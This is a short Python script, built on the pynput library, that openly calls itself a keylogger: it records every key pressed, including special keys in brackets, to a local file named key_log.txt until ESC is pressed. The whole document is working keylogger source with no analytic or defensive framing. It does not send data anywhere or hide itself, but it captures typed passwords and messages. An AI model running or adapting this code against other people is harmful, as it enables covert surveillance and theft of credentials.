from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        # If the key is printable (like letters, numbers, space)
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If the key is special (like ctrl, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("🔴 Keylogger is running... Press ESC to stop.")
    listener.join()
